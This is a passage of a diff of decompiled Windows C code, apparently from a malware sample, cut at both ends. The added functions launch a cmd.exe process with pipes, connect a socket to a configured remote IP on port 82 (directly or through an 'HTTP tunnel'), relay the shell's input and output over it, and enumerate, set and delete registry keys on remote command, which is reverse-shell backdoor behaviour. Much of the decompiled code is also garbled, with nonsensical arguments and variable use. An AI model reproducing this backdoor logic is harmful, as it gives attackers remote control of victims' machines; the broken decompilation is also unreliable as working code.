+        g5 = *(int32_t *)v12;
+        g7 = *(int32_t *)(v12 + 4);
+        g3 = *(int32_t *)(v12 + 8);
+        g2 = v1;
         return result;
     }
     // 0x405191
-    *found_char_pos2 = (char)v4;
+    *found_char_pos2 = (char)v7;
+    v5 = (char *)92;
     char * found_char_pos3 = strrchr((char *)&str2, 92); // 0x40519c
-    int32_t v6 = (int32_t)found_char_pos3; // 0x40519c
-    int32_t v7; // 0x4051c3
-    int32_t lpCommandLine2; // 0x4051e610
-    if (v6 != v4) {
-        char v8 = v4; // 0x4051b3
-        int32_t v9;
-        if (*(char *)(v6 - 1) != 58) {
-            // 0x4051b3
-            *found_char_pos3 = v8;
-            v9 = lpCommandLine;
-            // branch -> 0x4051b5
-        } else {
-            // 0x4051ae
-            *(char *)(v6 + 1) = v8;
-            v9 = *(int32_t *)&v1;
-            // branch -> 0x4051b5
-        }
-        // 0x4051b5
-        __pseudo_call(func);
-        lpCommandLine2 = v9;
-        v7 = v4;
-        // branch -> 0x4051be
-    } else {
-        lpCommandLine2 = lpCommandLine;
-        v7 = v6;
+    int32_t v14 = (int32_t)found_char_pos3; // 0x40519c
+    if (v14 == v7) {
+        v10 = v4;
+        // 0x4051be
+        *(int32_t *)(v10 - 4) = 68;
+        v13 = &v9;
+        *(int32_t *)(v10 - 8) = v7;
+        *(int32_t *)(v10 - 12) = v13;
+        memset((int32_t *)v5, v3, v2);
+        v11 = g8;
+        *(int32_t *)(v11 + 8) = (int32_t)&v8;
+        *(int32_t *)(v11 + 4) = v13;
+        *(int32_t *)v11 = v7;
+        *(int32_t *)(v11 - 4) = v7;
+        *(int32_t *)(v11 - 8) = v7;
+        *(int32_t *)(v11 - 12) = v7;
+        *(int32_t *)(v11 - 16) = v7;
+        *(int32_t *)(v11 - 20) = v7;
+        *(int32_t *)(v11 - 24) = (int32_t)str;
+        *(int32_t *)(v11 - 28) = v7;
+        result = CreateProcessA((char *)1, (char *)(v7 & 0xffff), (struct _SECURITY_ATTRIBUTES *)&lpProcessAttributes, (struct _SECURITY_ATTRIBUTES *)&lpProcessAttributes, (bool)&lpProcessAttributes, (int32_t)&lpProcessAttributes, &lpProcessAttributes, (char *)&lpProcessAttributes, (struct _STARTUPINFOA *)&lpProcessAttributes, (struct _PROCESS_INFORMATION *)&lpProcessAttributes);
+        v12 = g8;
+        g5 = *(int32_t *)v12;
+        g7 = *(int32_t *)(v12 + 4);
+        g3 = *(int32_t *)(v12 + 8);
+        g2 = v1;
+        return result;
     }
+    char v15 = v7; // 0x4051b3
+    if (*(char *)(v14 - 1) != 58) {
+        // 0x4051b3
+        *found_char_pos3 = v15;
+        // branch -> 0x4051b5
+    } else {
+        // 0x4051ae
+        *(char *)(v14 + 1) = v15;
+        // branch -> 0x4051b5
+    }
+    int32_t v16 = 0; // bp-599
+    v5 = (char *)&v16;
+    v10 = v6;
+    // branch -> 0x4051be
     // 0x4051be
-    lpStartupInfo = 0;
-    memset(&lpStartupInfo, v7, 68);
-    lpProcessInformation = 0;
-    dwCreationFlags = v4;
-    lpApplicationName = (char *)dwCreationFlags;
-    lpProcessAttributes = (struct _SECURITY_ATTRIBUTES *)dwCreationFlags;
-    result = CreateProcessA(lpApplicationName, (char *)lpCommandLine2, lpProcessAttributes, lpProcessAttributes, (dwCreationFlags & 1) != 0, dwCreationFlags, (int32_t *)dwCreationFlags, lpApplicationName, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation);
-    g5 = v3;
-    g2 = v2;
+    *(int32_t *)(v10 - 4) = 68;
+    v13 = &v9;
+    *(int32_t *)(v10 - 8) = v7;
+    *(int32_t *)(v10 - 12) = v13;
+    memset((int32_t *)v5, v3, v2);
+    v11 = g8;
+    *(int32_t *)(v11 + 8) = (int32_t)&v8;
+    *(int32_t *)(v11 + 4) = v13;
+    *(int32_t *)v11 = v7;
+    *(int32_t *)(v11 - 4) = v7;
+    *(int32_t *)(v11 - 8) = v7;
+    *(int32_t *)(v11 - 12) = v7;
+    *(int32_t *)(v11 - 16) = v7;
+    *(int32_t *)(v11 - 20) = v7;
+    *(int32_t *)(v11 - 24) = (int32_t)str;
+    *(int32_t *)(v11 - 28) = v7;
+    result = CreateProcessA((char *)1, (char *)(v7 & 0xffff), (struct _SECURITY_ATTRIBUTES *)&lpProcessAttributes, (struct _SECURITY_ATTRIBUTES *)&lpProcessAttributes, (bool)&lpProcessAttributes, (int32_t)&lpProcessAttributes, &lpProcessAttributes, (char *)&lpProcessAttributes, (struct _STARTUPINFOA *)&lpProcessAttributes, (struct _PROCESS_INFORMATION *)&lpProcessAttributes);
+    v12 = g8;
+    g5 = *(int32_t *)v12;
+    g7 = *(int32_t *)(v12 + 4);
+    g3 = *(int32_t *)(v12 + 8);
+    g2 = v1;
     return result;
 }
 
-// Address range: 0x405908 - 0x405956
-int32_t function_405908(int32_t * hKey, int32_t a2, int32_t lpValueName, int32_t dwType, int32_t lpData, int32_t cbData, int32_t a7) {
+// Address range: 0x4051f5 - 0x405222
+int32_t function_4051f5(void) {
+    int32_t v1 = g4; // 0x4051f5
+    int32_t lpThreadId = v1; // bp-4
+    g63 = 79;
+    function_403e89(v1);
+    int32_t threadHandle; // 0x405221
+    if (g55 == 0) {
+        // 0x40520c
+        threadHandle = (int32_t)CreateThread(NULL, 0, (int32_t (*)(int32_t *))0x405222, NULL, 0, &lpThreadId);
+        // branch -> 0x405220
+    } else {
+        threadHandle = 0;
+    }
+    // 0x405220
+    g4 = *(int32_t *)g8;
+    return threadHandle;
+}
+
+// Address range: 0x405222 - 0x40554c
+int32_t function_405222(void) {
+    struct in_addr in; // 0x40534f
+    struct in_addr in2; // 0x405451
+    char * flags2 = (char *)0; // bp-4
+    g2 = (int32_t)&flags2;
+    g1 = 0x1540;
+    function_405a10();
+    char * buf = (char *)0; // bp-12
+    int32_t v1 = (int32_t)&buf; // 0x405230
+    char * v2 = "Kernel32.dll"; // bp-20
+    int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x405237
+    int32_t hWritePipe = (int32_t)moduleHandle; // bp-28
+    GetProcAddress(moduleHandle, "TerminateProcess");
+    FreeLibrary(moduleHandle);
+    int32_t nSize = 0; // esi
+    int32_t hReadPipe = 0; // bp-36
+    buf = NULL;
+    g55 = 1;
+    int32_t ** lpPipeAttributes = (int32_t **)12; // bp-48
+    CreatePipe((int32_t **)12, NULL, (struct _SECURITY_ATTRIBUTES *)1, 0);
+    struct _SECURITY_ATTRIBUTES * lpCommandLine = (struct _SECURITY_ATTRIBUTES *)&lpPipeAttributes; // bp-56
+    CreatePipe((int32_t **)&hReadPipe, (int32_t **)&hWritePipe, (struct _SECURITY_ATTRIBUTES *)&lpPipeAttributes, nSize);
+    char * lpStartupInfo; // bp-140
+    memset((int32_t *)&lpStartupInfo, nSize, 68);
+    lpCommandLine = (struct _SECURITY_ATTRIBUTES *)0x2e646d63;
+    struct _STARTUPINFOA * lpProcessInformation = NULL; // bp-72
+    lpProcessInformation = (struct _STARTUPINFOA *)&lpStartupInfo;
+    char * lpApplicationName = (char *)nSize; // 0x4052db
+    struct _SECURITY_ATTRIBUTES * lpProcessAttributes = (struct _SECURITY_ATTRIBUTES *)nSize; // 0x4052df
+    CreateProcessA(lpApplicationName, (char *)&lpCommandLine, lpProcessAttributes, lpProcessAttributes, true, nSize, (int32_t *)nSize, lpApplicationName, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation);
+    Sleep(1000);
+    int32_t sock = function_40554c(); // 0x4052fd
+    int32_t v3 = g7; // 0x405302
+    int32_t v4; // 0x405535
+    int32_t * v5; // 0x40553c
+    if (sock == v3) {
+        // 0x405535
+        v4 = g8;
+        *(int32_t *)(v4 - 4) = sock;
+        *(int32_t *)(v4 - 8) = (int32_t)lpProcessInformation;
+        v5 = (int32_t *)(v4 - 12);
+        *v5 = 1;
+        g55 = g7;
+        return *v5;
+    }
+    char * str2 = g56 == v3 ? "!!Connect Directly!!\n" : "!!Connect Through HTTP Tunnel!!\n";
+    int32_t str; // bp-396
+    strcpy((char *)&str, str2);
+    int32_t lpBytesLeftThisMessage = strlen((char *)&str) + 4; // 0x40533c
+    int32_t v6 = *(int32_t *)&g39; // 0x40534931
+    struct _SECURITY_ATTRIBUTES * v7 = NULL; // bp-128
+    *(int32_t *)&v7 = v6;
+    in = (struct in_addr){
+        .e0 = 0
+    };
+    in.e0 = v6;
+    int32_t v8 = (int32_t)inet_ntoa(in); // 0x40534f
+    int32_t str3; // bp-3396
+    int32_t nBufferSize = &str3; // 0x405356
+    function_40267d((char *)&str3, v8);
+    lpStartupInfo = (char *)&str3;
+    int32_t len = strlen((char *)&str3); // 0x405369
+    *(int32_t *)(g2 - 3392 + len) = strlen((char *)&str);
+    int32_t v9 = len + 4; // 0x40538a
+    int32_t len2 = strlen((char *)&str); // 0x40538d
+    memcpy((int32_t *)(g2 - 3392 + v9), &str, len2);
+    int32_t length = v9 + strlen((char *)&str); // 0x4053b6
+    g5 = length;
+    int32_t flags = g7; // 0x4053be
+    struct _OVERLAPPED * lpOverlapped2 = (struct _OVERLAPPED *)flags; // bp-116
+    v7 = (struct _SECURITY_ATTRIBUTES *)sock;
+    send(sock, (char *)&str3, length, flags);
+    int32_t hNamedPipe = 100; // bp-132
+    int32_t v10; // bp-5444
+    int32_t v11 = &v10; // 0x4053d4
+    int32_t * lpBytesRead = (int32_t *)length;
+    char * v12 = (char *)sock;
+    int32_t v13 = -1;
+    int32_t dwMilliseconds = 100; // 0x4053cc
+    // branch -> 0x4053cc
+    while (true) {
+        // 0x4053cc
+        Sleep(dwMilliseconds);
+        *(int32_t *)(g8 - 4) = g7;
+        *(int32_t *)(g8 - 8) = g7;
+        *(int32_t *)(g8 - 12) = v1;
+        *(int32_t *)(g8 - 16) = 2048;
+        *(int32_t *)(g8 - 20) = v11;
+        *(int32_t *)(g8 - 24) = (int32_t)v2;
+        PeekNamedPipe((int32_t *)hNamedPipe, &v7->e0, nBufferSize, lpBytesRead, &lpOverlapped2->e0, (int32_t *)(char *)lpBytesLeftThisMessage);
+        int32_t v14 = (int32_t)buf; // 0x4053e9
+        int32_t v15 = g7; // 0x4053e9
+        struct _OVERLAPPED * lpOverlapped;
+        char * v16;
+        int32_t hFile; // 0x40550f
+        if (v14 == v15) {
+            // 0x4054bd
+            int32_t sock2;
+            if (v13 > v14) {
+                sock2 = v13;
+              lab_0x4054ec:;
+                int32_t v17 = 2047;
+                if (sock2 < 2048) {
+                    // 0x4054f6
+                    v17 = sock2;
+                    // branch -> 0x4054f9
+                }
+                // 0x4054f9
+                *(int32_t *)(g8 - 4) = g7;
+                *(int32_t *)(g8 - 8) = v17;
+                *(int32_t *)(g8 - 12) = v11;
+                int32_t length2 = (int32_t)v12; // 0x405502
+                *(int32_t *)(g8 - 16) = length2;
+                int32_t v18 = recv(sock2, buf, length2, (int32_t)flags2); // 0x405505
+                int32_t v19 = g7; // 0x40550b
+                if (v18 > v19) {
+                    // 0x40550f
+                    hFile = sock2 - v18;
+                    g4 = v1;
+                    *(int32_t *)(g8 - 4) = v19;
+                    *(int32_t *)(g8 - 8) = v1;
+                    *(int32_t *)(g8 - 12) = v18;
+                    *(int32_t *)(g8 - 16) = v11;
+                    *(int32_t *)(g8 - 20) = hWritePipe;
+                    lpOverlapped = NULL;
+                    if (WriteFile((int32_t *)hFile, (int32_t *)buf, length2, (int32_t *)flags2, lpOverlapped)) {
+                        v16 = v12;
+                      lab_0x4054b6:
+                        // 0x4054b6
+                        *(int32_t *)(g8 - 4) = 10;
+                        v12 = v16;
+                        v13 = hFile;
+                        dwMilliseconds = hNamedPipe;
+                        // branch -> 0x4053cc
+                        continue;
+                    }
+                } else {
+                    hFile = sock2;
+                }
+            } else {
+                int32_t v20 = (int32_t)v12; // 0x4054c2
+                *(int32_t *)(g8 - 4) = v20;
+                int32_t v21 = function_40277e(); // 0x4054c5
+                if (v21 != g7) {
+                    // 0x4054cf
+                    if (v21 != -1) {
+                        // 0x4054d4
+                        if (v21 < 0x3e800) {
+                            // 0x4054db
+                            *(int32_t *)g8 = v20;
+                            int32_t v22 = function_4055cd(); // 0x4054de
+                            if (v22 != -1) {
+                                sock2 = v22;
+                                goto lab_0x4054ec;
+                            }
+                            // 0x40552c
+                            *(int32_t *)(g8 - 4) = (int32_t)v12;
+                            closesocket(-1);
+                            // branch -> 0x405535
+                            // 0x405535
+                            v4 = g8;
+                            *(int32_t *)(v4 - 4) = g7;
+                            *(int32_t *)(v4 - 8) = (int32_t)lpProcessInformation;
+                            v5 = (int32_t *)(v4 - 12);
+                            *v5 = 1;
+                            g55 = g7;
+                            return *v5;
+                        }
+                        hFile = v13;
+                    } else {
+                        hFile = v13;
+                    }
+                } else {
+                    hFile = v13;
+                }
+            }
+            // 0x40552c
+            *(int32_t *)(g8 - 4) = (int32_t)v12;
+            closesocket(hFile);
+            // branch -> 0x405535
+            // 0x405535
+            v4 = g8;
+            *(int32_t *)(v4 - 4) = g7;
+            *(int32_t *)(v4 - 8) = (int32_t)lpProcessInformation;
+            v5 = (int32_t *)(v4 - 12);
+            *v5 = 1;
+            g55 = g7;
+            return *v5;
+        }
+        // 0x4053f2
+        *(int32_t *)(g8 - 4) = v15;
+        *(int32_t *)(g8 - 8) = v1;
+        *(int32_t *)(g8 - 12) = (int32_t)buf;
+        *(int32_t *)(g8 - 16) = v11;
+        *(int32_t *)(g8 - 20) = (int32_t)v2;
+        if (ReadFile((int32_t *)hNamedPipe, &v7->e0, nBufferSize, lpBytesRead, lpOverlapped2)) {
+            // 0x405412
+            int32_t v23;
+            char * str4;
+            if (g56 != g7) {
+                // 0x40541a
+                *(int32_t *)(g8 - 4) = (int32_t)v12;
+                closesocket(-1);
+                *(int32_t *)(g8 - 4) = 100;
+                Sleep(-1);
+                int32_t v24 = function_40554c(); // 0x40542b
+                char * v25 = (char *)v24; // 0x405432
+                if (v24 != g7) {
+                    str4 = v25;
+                    v23 = -1;
+                    goto lab_0x40543b;
+                }
+                // 0x40552c
+                *(int32_t *)(g8 - 4) = (int32_t)v25;
+                closesocket(-1);
+                // branch -> 0x405535
+                // 0x405535
+                v4 = g8;
+                *(int32_t *)(v4 - 4) = g7;
+                *(int32_t *)(v4 - 8) = (int32_t)lpProcessInformation;
+                v5 = (int32_t *)(v4 - 12);
+                *v5 = 1;
+                g55 = g7;
+                return *v5;
+            }
+            str4 = v12;
+            v23 = v13;
+          lab_0x40543b:
+            // 0x40543b
+            *(int32_t *)(g8 - 4) = (int32_t)buf + 4;
+            *(int32_t *)(g8 - 8) = 1;
+            *(int32_t *)(g8 - 12) = (int32_t)&g74;
+            *(int32_t *)(g8 - 16) = 82;
+            *(int32_t *)(g8 - 20) = (int32_t)g39;
+            int32_t sock3 = (int32_t)str4; // 0x405451
+            in2 = (struct in_addr){
+                .e0 = 0
+            };
+            in2.e0 = sock3;
+            *(int32_t *)(g8 - 4) = (int32_t)inet_ntoa(in2);
+            *(int32_t *)(g8 - 8) = nBufferSize;
+            function_40267d(str4, (int32_t)flags2);
+            *(int32_t *)(g8 - 4) = nBufferSize;
+            int32_t len3 = strlen(str4); // edi
+            int32_t v26 = (int32_t)buf; // 0x405472
+            *(int32_t *)(g8 - 4) = v26;
+            *(int32_t *)(g2 - 3392 + len3) = v26;
+            len3 += 4;
+            *(int32_t *)(g8 - 4) = v11;
+            *(int32_t *)(g8 - 8) = g2 - 3392 + len3;
+            memcpy((int32_t *)str4, (int32_t *)flags2, (int32_t)lpOverlapped);
+            g5 = (int32_t)buf + len3;
+            int32_t v27 = g8 + 40; // 0x40549a
+            int32_t v28 = g7; // 0x40549a
+            // branch -> 0x40549a
+            while (true) {
+                // 0x40549a
+                *(int32_t *)(v27 - 4) = v28;
+                *(int32_t *)(v27 - 8) = g5;
+                *(int32_t *)(v27 - 12) = nBufferSize;
+                *(int32_t *)(v27 - 16) = sock3;
+                int32_t * flags3;
+                int32_t v29 = send(sock3, flags2, (int32_t)lpOverlapped, (int32_t)&flags3); // 0x4054a6
+                int32_t v30 = g7; // 0x4054ac
+                if (v29 >= v30) {
+                    int32_t v31 = g5 - v29; // 0x4054b0
+                    g5 = v31;
+                    if ((char *)v31 <= (char *)v30) {
+                        v16 = str4;
+                        hFile = v23;
+                        goto lab_0x4054b6;
+                    }
+                    // 0x4054b0
+                    v27 = g8;
+                    v28 = v30;
+                    // branch -> 0x40549a
+                    continue;
+                }
+            }
+            // 0x40552c
+            *(int32_t *)(g8 - 4) = (int32_t)str4;
+            closesocket(v23);
+            // branch -> 0x405535
+            // 0x405535
+            v4 = g8;
+            *(int32_t *)(v4 - 4) = g7;
+            *(int32_t *)(v4 - 8) = (int32_t)lpProcessInformation;
+            v5 = (int32_t *)(v4 - 12);
+            *v5 = 1;
+            g55 = g7;
+            return *v5;
+        }
+        // 0x40552c
+        *(int32_t *)(g8 - 4) = (int32_t)v12;
+        closesocket(v13);
+        // branch -> 0x405535
+        // 0x405535
+        v4 = g8;
+        *(int32_t *)(v4 - 4) = g7;
+        *(int32_t *)(v4 - 8) = (int32_t)lpProcessInformation;
+        v5 = (int32_t *)(v4 - 12);
+        *v5 = 1;
+        g55 = g7;
+        return *v5;
+    }
+}
+
+// Address range: 0x40554c - 0x4055cd
+int32_t function_40554c(void) {
+    int32_t v1 = g2; // 0x40554c
+    int16_t v2; // bp-20
+    int32_t v3 = &v2; // 0x40554f
+    int32_t addr = (int32_t)g39; // esi
+    int32_t v4 = 82; // edi
+    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x405564
+    int32_t v5; // 0x4055c8
+    if (sock_fd == -1) {
+        // 0x4055c2
+        // branch -> 0x4055c8
+        // 0x4055c8
+        v5 = g8;
+        g5 = *(int32_t *)v5;
+        g7 = *(int32_t *)(v5 + 4);
+        g2 = v1;
+        return 0;
+    }
+    // 0x405571
+    if (g62 != NULL) {
+        // 0x40557a
+        if (g56 != 0) {
+            int32_t v6 = inet_addr((char *)&g60); // 0x405588
+            v4 = g61;
+            addr = v6;
+            // branch -> 0x405596
+        }
+    }
+    // 0x405596
+    *(int32_t *)(g8 - 4) = v4;
+    v2 = 2;
+    int16_t sock = htons(2); // 0x40559d
+    *(int32_t *)(g8 - 4) = 16;
+    *(int32_t *)(g8 - 8) = v3;
+    *(int32_t *)(g8 - 12) = sock_fd;
+    int32_t * addr_len;
+    int32_t v7 = connect((int32_t)sock, (struct sockaddr *)addr, (int32_t)&addr_len); // 0x4055b1
+    int32_t result;
+    if (v7 != 0) {
+        // 0x4055bb
+        *(int32_t *)(g8 - 4) = sock_fd;
+        closesocket(addr);
+        // branch -> 0x4055c2
+        // 0x4055c2
+        result = 0;
+        // branch -> 0x4055c8
+    } else {
+        result = sock_fd;
+    }
+    // 0x4055c8
+    v5 = g8;
+    g5 = *(int32_t *)v5;
+    g7 = *(int32_t *)(v5 + 4);
+    g2 = v1;
+    return result;
+}
+
+// Address range: 0x4055cd - 0x4055f3
+int32_t function_4055cd(void) {
+    int32_t v1 = g2; // bp-4
+    int32_t buf = 0; // bp-20
+    int32_t sock;
+    if (recv(sock, (char *)&buf, 4, 0) == 4) {
+        // 0x4055ee
+        g2 = v1;
+        return buf;
+    }
+    // 0x4055e9
+    g2 = v1;
+    return -1;
+}
+
+// Address range: 0x4055f3 - 0x405676
+int32_t function_4055f3(void) {
+    int32_t v1 = g4; // bp-8
+    int32_t v2 = &v1; // 0x4055f6
+    int32_t v3 = g7; // 0x4055f7
+    g5 = 5;
+    int32_t * mem = malloc(0x3e800); // 0x405601
+    int32_t v4 = (int32_t)mem; // 0x405601
+    g7 = v4;
+    int32_t v5; // 0x405659
+    int32_t v6;
+    char * v7;
+    if (mem == NULL) {
+        // 0x4055f3
+        v7 = NULL;
+        v6 = v4 + 5;
+        v5 = g5;
+        // branch -> 0x40564c
+    } else {
+        int32_t v8 = v4 + 5; // 0x40560e
+        *(char *)mem = 97;
+        struct _NETRESOURCEA * v9 = g33; // 0x405615
+        int32_t v10 = function_40576c((char *)v9->e0, (int32_t)v9 + 4, v8); // 0x405620
+        int32_t v11 = v10 + 5; // 0x405625
+        v1 = v10;
+        *(char *)(v11 + v4) = 1;
+        int32_t v12 = v11 + 1; // 0x40562f
+        g5 = v12;
+        int32_t v13 = v12 + v4; // 0x405630
+        struct _NETRESOURCEA * v14 = g33; // 0x405634
+        int32_t v15 = function_4057de((int32_t *)v14->e0, (int32_t)v14 + 4, v13); // 0x40563f
+        v1 = v15;
+        int32_t v16 = g5 + v15; // 0x40564a
+        g5 = v16;
+        v7 = (char *)mem;
+        v6 = v8;
+        v5 = v16;
+        // branch -> 0x40564c
+    }
+    int32_t v17 = v5 - 5; // 0x405653
+    g4 = v17;
+    *(int32_t *)(v4 + 1) = v5;
+    function_402830(v6, v17, (char *)v6, v2);
+    function_401f45(v7, g5);
+    free(mem);
+    g7 = v3;
+    int32_t * v18;
+    return (int32_t)&v18;
+}
+
+// Address range: 0x405676 - 0x4056ae
+int32_t function_405676(void) {
+    int32_t str = (int32_t)g33 + 4; // 0x40567c
+    int32_t len = strlen((char *)str); // 0x405680
+    int32_t v1 = g33->e0; // 0x405690
+    function_405957((int32_t *)v1, str, len + 1 + str);
+    g63 = 69;
+    int32_t result = function_403e89(v1); // 0x4056a7
+    return result;
+}
+
+// Address range: 0x4056ae - 0x4056fc
+int32_t function_4056ae(void) {
+    int32_t v1 = g7; // 0x4056b3
+    int32_t str = (int32_t)g33 + 4; // 0x4056b5
+    g7 = str;
+    int32_t str2 = strlen((char *)str) + 1 + g7; // 0x4056be
+    g5 = str2;
+    int32_t len = strlen((char *)str2); // 0x4056c3
+    int32_t v2 = g5; // 0x4056c8
+    int32_t v3 = *(int32_t *)(len + 5 + v2); // 0x4056c8
+    int32_t v4 = len + 1 + v2; // 0x4056cc
+    int32_t v5 = *(int32_t *)v4; // 0x4056d4
+    int32_t v6 = g33->e0; // 0x4056dd
+    function_405908((int32_t *)v6, g7, v2, v5, v4 + 8, v3);
+    g63 = 69;
+    int32_t result = function_403e89(v6); // 0x4056f4
+    g7 = v1;
+    return result;
+}
+
+// Address range: 0x4056fc - 0x405734
+int32_t function_4056fc(void) {
+    int32_t v1 = g7; // 0x405701
+    int32_t str = (int32_t)g33 + 4; // 0x405702
+    g7 = str;
+    int32_t len = strlen((char *)str); // 0x405706
+    int32_t v2 = g7; // 0x40570b
+    int32_t v3 = g33->e0; // 0x405716
+    function_40586a((int32_t *)v3, v2, len + 1 + v2);
+    g63 = 69;
+    int32_t result = function_403e89(v3); // 0x40572d
+    g7 = v1;
+    return result;
+}
+
+// Address range: 0x405734 - 0x40576c
+int32_t function_405734(void) {
+    int32_t v1 = g7; // 0x405739
+    int32_t str = (int32_t)g33 + 4; // 0x40573a
+    g7 = str;
+    int32_t len = strlen((char *)str); // 0x40573e
+    int32_t v2 = g7; // 0x405743
+    int32_t v3 = g33->e0; // 0x40574e
+    function_4058c4((int32_t *)v3, v2, len + 1 + v2);
+    g63 = 69;
+    int32_t result = function_403e89(v3); // 0x405765
+    g7 = v1;
+    return result;
+}
+
+// Address range: 0x40576c - 0x4057de
+int32_t function_40576c(char * hKey, int32_t a2, int32_t lpName) {
+    char * hKey2 = hKey;
+    char * lpSubKey = (char *)a2;
+    char * phkResult = lpSubKey;
+    int32_t v1 = 0; // ebx
+    int32_t result = 0; // esi
+    if (RegOpenKeyExA((int32_t *)hKey, lpSubKey, 0, 0xf003f, (int32_t **)&phkResult) == 0) {
+        int32_t v2 = g5; // bp-40
+        int32_t hKey3 = 0;
+        int32_t v3 = &v2; // 0x40579b
+        // branch -> 0x405798
+        while (true) {
+            // 0x405798
+            *(int32_t *)(v3 - 4) = v1;
+            *(int32_t *)(v3 - 8) = v1;
+            *(int32_t *)(v3 - 12) = v1;
+            int32_t v4 = lpName + result; // edi
+            *(int32_t *)(v3 - 16) = v1;
+            *(int32_t *)(v3 - 20) = (int32_t)&hKey2;
+            *(int32_t *)(v3 - 24) = v4;
+            hKey2 = (char *)260;
+            *(int32_t *)(v3 - 28) = hKey3;
+            *(int32_t *)(v3 - 32) = (int32_t)phkResult;
+            int32_t * lpcchName;
+            int32_t v5 = RegEnumKeyExA((int32_t *)hKey2, (int32_t)phkResult, (char *)lpName, &lpcchName, &lpcchName, (char *)&lpcchName, &lpcchName, (struct _FILETIME *)&lpcchName); // 0x4057b4
+            if (v5 != 0) {
+                // 0x4057ce
+                *(int32_t *)(g8 - 4) = (int32_t)phkResult;
+                RegCloseKey((int32_t *)hKey3);
+                // branch -> 0x4057da
+                // 0x4057da
+                return result;
+            }
+            // 0x4057be
+            *(int32_t *)(g8 - 4) = v4;
+            result += strlen(hKey2) + 1;
+            hKey3++;
+            v3 = g8 + 4;
+            // branch -> 0x405798
+        }
+    }
+    // 0x4057da
+    return 0;
+}
+
+// Address range: 0x4057de - 0x40586a
+int32_t function_4057de(int32_t * hKey, int32_t a2, int32_t dwIndex) {
+    char * lpSubKey = (char *)a2;
+    char * hKey2 = lpSubKey;
+    int32_t phkResult = (int32_t)hKey;
+    int32_t result = 0; // esi
+    int32_t v1 = 0; // ebx
+    int32_t v2; // 0x405866
+    if (RegOpenKeyExA(hKey, lpSubKey, 0, 0xf003f, (int32_t **)&phkResult) == 0) {
+        int32_t v3 = g5; // bp-36
+        int32_t v4 = &dwIndex; // 0x405824
+        int32_t v5 = &v3; // 0x405813
+        // branch -> 0x405809
+        while (true) {
+            // 0x405809
+            dwIndex = 256;
+            *(int32_t *)(v5 - 4) = (int32_t)&hKey2;
+            *(int32_t *)(v5 - 8) = dwIndex + 264 + result;
+            *(int32_t *)(v5 - 12) = dwIndex + 256 + result;
+            *(int32_t *)(v5 - 16) = 0;
+            *(int32_t *)(v5 - 20) = v4;
+            hKey2 = (char *)0x2800;
+            *(int32_t *)(v5 - 24) = dwIndex + result;
+            *(int32_t *)(v5 - 28) = v1;
+            *(int32_t *)(v5 - 32) = phkResult;
+            int32_t * lpValueName;
+            int32_t v6 = RegEnumValueA((int32_t *)hKey2, dwIndex, (char *)&lpValueName, &lpValueName, &lpValueName, &lpValueName, (char *)&lpValueName, &lpValueName); // 0x405839
+            if (v6 != 0) {
+                // 0x40585a
+                *(int32_t *)(g8 - 4) = phkResult;
+                RegCloseKey((int32_t *)hKey2);
+                g5 = *(int32_t *)g8;
+                v2 = g8 + 4;
+                // branch -> 0x405866
+                // 0x405866
+                g7 = *(int32_t *)v2;
+                g3 = *(int32_t *)(v2 + 4);
+                g2 = *(int32_t *)(v2 + 8);
+                return result;
+            }
+            // 0x405843
+            v1++;
+            *(int32_t *)(result + 260 + dwIndex) = (int32_t)hKey2;
+            result += (int32_t)hKey2 + 264;
+            v5 = g8;
+            // branch -> 0x405809
+        }
+    } else {
+        // 0x405801
+        v2 = g8;
+        // branch -> 0x405866
+    }
+    // 0x405866
+    g7 = *(int32_t *)v2;
+    g3 = *(int32_t *)(v2 + 4);
+    g2 = *(int32_t *)(v2 + 8);
+    return 0;
+}
+
+// Address range: 0x40586a - 0x4058c4
+int32_t function_40586a(int32_t * hKey, int32_t a2, int32_t a3) {
+    char * lpSubKey = (char *)a2;
+    char * phkResult = lpSubKey;
+    int32_t v1 = g2; // bp-4
+    if (RegOpenKeyExA(hKey, lpSubKey, 0, 0xf003f, (int32_t **)&phkResult) != 0) {
+        // 0x40588b
+        g2 = v1;
+        return 0;
+    }
+    int32_t v2 = SHDeleteKeyA((int32_t *)*(int32_t *)&phkResult, (char *)a3); // 0x405896
+    int32_t str = 0; // bp-36
+    sprintf((char *)&str, "%d", v2);
+    int32_t hKey2 = *(int32_t *)&phkResult; // 0x4058b112
+    RegCloseKey((int32_t *)hKey2);
+    g7 = hKey2;
+    g2 = v1;
+    return v2 == 0;
+}
+
+// Address range: 0x4058c4 - 0x405908
+int32_t function_4058c4(int32_t * hKey, int32_t a2, int32_t lpValueName) {
+    char * lpSubKey = (char *)a2;
+    char * phkResult = lpSubKey;
+    if (RegOpenKeyExA(hKey, lpSubKey, 0, 0xf003f, (int32_t **)&phkResult) != 0) {
+        // 0x4058e2
+        g2 = (int32_t)hKey;
+        return 0;
+    }
+    int32_t hKey2 = *(int32_t *)&phkResult; // 0x4058ea10
+    char * v1 = NULL; // bp-36
+    *(int32_t *)&v1 = hKey2;
+    int32_t v2 = RegDeleteValueA((int32_t *)hKey2, (char *)lpValueName); // 0x4058ed
+    int32_t hKey3 = *(int32_t *)&phkResult; // 0x4058f311
+    RegCloseKey((int32_t *)hKey3);
+    g7 = hKey3;
+    g2 = (int32_t)v1;
+    return v2 == 0;
+}
+
+// Address range: 0x405908 - 0x405957
+int32_t function_405908(int32_t * hKey, int32_t a2, int32_t lpValueName, int32_t dwType, int32_t lpData, int32_t cbData) {
     char * lpSubKey = (char *)a2;
     char * phkResult = lpSubKey;
     if (RegOpenKeyExA(hKey, lpSubKey, 0, 0xf003f, (int32_t **)&phkResult) != 0) {
         // 0x405926
+        g2 = (int32_t)hKey;
         return 0;
     }
     int32_t hKey2 = *(int32_t *)&phkResult; // 0x40593913
-    int32_t v1 = RegSetValueExA((int32_t *)hKey2, (char *)lpValueName, 0, dwType, (char *)lpData, cbData); // 0x40593c
-    RegCloseKey((int32_t *)*(int32_t *)&phkResult);
-    return v1 == 0;
+    char * v1 = NULL; // bp-52
+    *(int32_t *)&v1 = hKey2;
+    int32_t v2 = RegSetValueExA((int32_t *)hKey2, (char *)lpValueName, 0, dwType, (char *)lpData, cbData); // 0x40593c
+    int32_t hKey3 = *(int32_t *)&phkResult; // 0x40594214
+    RegCloseKey((int32_t *)hKey3);
+    g7 = hKey3;
+    g2 = (int32_t)v1;
